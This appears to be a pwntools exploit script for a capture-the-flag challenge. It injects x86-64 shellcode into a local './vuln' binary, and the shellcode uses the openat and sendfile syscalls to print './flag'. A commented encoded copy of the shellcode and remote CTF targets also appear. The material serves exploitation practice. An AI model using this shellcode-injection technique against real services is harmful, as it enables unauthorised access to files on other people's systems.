from pwn import *

# io = remote("192.168.170.128", 1234)
io = process("./vuln")
# io = remote("xyctf.top", 48576)
# gdb.attach(io)
# context(os="linux", arch="amd64")
context(os="linux", arch="amd64", log_level="debug")
# elf = ELF('./shell')
# puts_got = elf.got['puts']
# libc = ELF('./libc.so.6')

__NR_openat = 257
__NR_sendfile = 40

shellcode = '''
push -100
pop rdi
mov rax, %s
push rax
mov rsi, rsp
mov rdx, 0
push 257
pop rax
syscall

push 1
pop rdi
push 3
pop rsi
push 0
pop rdx
mov rax, 40
push rax
mov r10, rsp
push 40
pop rax
syscall
''' % hex(u64('./flag\x00\x00'))

# shellcode ="\x6a\x9c\x5f\x48\xc7\xc0\x66\x6c\x61\x67\x50\x48\x89\xe6\x48\xc7\xc2\x00\x00\x00\x00\x68\x01\x01\x00\x00\x58\x0f\x05\x6a\x01\x5f\x6a\x03\x5e\x6a\x28\x59\x6a\x00\x5a\x6a\x28\x58\x0f\x05"
gdb.attach(io)
pause()
io.sendline(asm(shellcode))

io.interactive()
# context.clear()
# context.arch = 'amd64'
# sc = 'push rbp; mov rbp, rsp;'
# sc += shellcraft.echo('Hello\n')
# sc += 'mov rsp, rbp; pop rbp; ret'
# solib1 = make_elf_from_assembly(shellcode, shared=1)
# subprocess.check_output(['echo', 'World'], env={'LD_PRELOAD': solib1}, universal_newlines = True)